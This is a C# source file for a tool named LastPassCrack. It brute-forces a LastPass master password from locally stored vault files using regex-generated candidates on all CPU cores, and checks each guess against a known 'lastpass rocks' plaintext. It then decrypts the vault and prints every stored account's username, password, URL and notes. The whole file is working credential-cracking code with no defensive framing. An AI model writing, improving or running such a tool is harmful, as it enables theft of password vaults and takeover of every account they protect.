using Fclp;
using LastPass;
using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Text;
using System.Threading;

namespace LastPassCrack
{
    public class Program
    {
        static string lastpass_rocks;

        static string username;

        static string password;

        static bool stopRequested = false;

        static PasswordIterator iterator;

#if DEBUG
        static int numberOfKeysChecked = 0;
        static Stopwatch stopwatch = new Stopwatch();
#endif

        static void Start()
        {
            string potentialPassword;
            while (!stopRequested && iterator.GetNext(out potentialPassword))
            {
                var key = FetcherHelper.MakeKey(username, potentialPassword, 5000);
                var decrypted = Tools.Decrypt(new DecryptData
                {
                    data = lastpass_rocks,
                    mode = Mode.ECB,
                    b64 = true,
                    iterations = 5000,
                    key = key
                });
#if DEBUG
                numberOfKeysChecked++;
#endif
                if (decrypted == "lastpass rocks")
                {
                    password = potentialPassword;
                    stopRequested = true;
#if DEBUG
                    stopwatch.Stop();
                    var millisecondsPerKey = stopwatch.ElapsedMilliseconds / (double)numberOfKeysChecked;
                    Tools.ConsoleOut.WriteLine(string.Format(
                        "miliseconds per key: {0}",
                        millisecondsPerKey.ToString("0.000", CultureInfo.InvariantCulture)
                        ));
#endif
                    break;
                }
            }
            Thread.CurrentThread.Abort();
        }

        private static void Main(string[] args)
        {
            username = "";
            string passwordRegex = "";
            string slpsPath = "";
            string sxmlPath = "";
            string unprotectPath = "";
            var parser = new FluentCommandLineParser();
            parser.Setup<string>('u', "username")
                .Callback(_ => username = _);
            parser.Setup<string>('p', "password")
                .Callback(_ => passwordRegex = _);
            parser.Setup<string>('x', "sxml")
                .Callback(_ => sxmlPath = _);
            parser.Setup<string>('l', "slps")
                .Callback(_ => slpsPath = _);
            parser.Setup<string>('r', "unprotect")
                .Callback(_ => unprotectPath = _);
            parser.Parse(args);
            if(string.IsNullOrEmpty(unprotectPath))
            {
                var message = new StringBuilder();
                var showMessage = false;
                message.Append("The following parameters must be specified:\n");
                if (string.IsNullOrEmpty(username))
                {
                    showMessage = true;
                    message.Append("--username\n");
                }
                if (string.IsNullOrEmpty(username))
                {
                    showMessage = true;
                    message.Append("--password\n");
                }
                if (string.IsNullOrEmpty(username))
                {
                    showMessage = true;
                    message.Append("--slps\n");
                }
                if (string.IsNullOrEmpty(username))
                {
                    showMessage = true;
                    message.Append("--sxml\n");
                }
                if (showMessage)
                {
                    Console.WriteLine(message.ToString());
                    return;
                }
            }         
            else
            {
                using(var reader = new StreamReader(unprotectPath))
                {
                    Console.WriteLine(Tools.Unprotect(reader.ReadToEnd()));
                    return;
                }
            }
            Tools.ConsoleOut = Console.Out;
            Console.SetOut(TextWriter.Null);
            iterator = new PasswordIterator(passwordRegex);
            password = "password not found";
            using (var slpsReader = new StreamReader(slpsPath))
            {
                var data = Tools.GetDataFromSlpsFile(slpsReader.ReadToEnd());
                lastpass_rocks = data.data;
            }
            var threadStart = new ThreadStart(Start);
            for (int i = 0; i < Environment.ProcessorCount; i++)
            {
                var thread = new Thread(threadStart);
                thread.Start();
            }
#if DEBUG
            stopwatch.Start();
#endif
            while (!stopRequested)
                Thread.Sleep(3000);
            if (password == "password not found")
            {
                Tools.ConsoleOut.WriteLine("password not found");
                return;
            }
            Tools.ConsoleOut.WriteLine(string.Format("{0} {1}", username, password));
            Tools.ConsoleOut.WriteLine();
            using (var sxmlReader = new StreamReader(sxmlPath))
            {
                var vault = Tools.GetVault(username, password, sxmlReader.ReadToEnd());
                foreach (var account in vault.Accounts)
                {
                    var output = string.Format(
                        "{0};{1};{2};{3};{4}",
                        account.Name.RemovePadding(),
                        account.Username.RemovePadding(),
                        account.Password.RemovePadding(),
                        account.Url,
                        account.Notes);
                    Tools.ConsoleOut.WriteLine(output);
                }
            }
        }
    }
}